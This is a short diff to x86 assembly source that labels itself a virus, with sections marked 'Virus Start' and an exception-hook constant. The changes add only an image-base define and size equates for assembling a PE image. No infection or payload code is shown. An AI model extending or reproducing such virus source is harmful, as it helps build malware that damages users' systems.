@@ -14,7 +14,7 @@
 ;*=====================================================*
 ;* v1.0
 ;********************************************************
-
+%define ImageBase 00400000h
 cpu 586
 bits 32
 org 400000h
@@ -126,6 +126,7 @@ dd VirusSize
 ;********************************************
 HookExceptionNumber equ 3h
 
+
 ;********************************************
 ;* Virus Start *
 ;********************************************
@@ -182,3 +183,8 @@ ExceptionOccured:
 
 IntHandler:
 
+virus_end:
+VirusSize equ $
+_SizeOfCode equ $
+_SizeOfHeaders equ (virus_start - Header) 
+_SizeOfImage equ ((virus_end - Header + 0xFFF) & ~0xFFF)
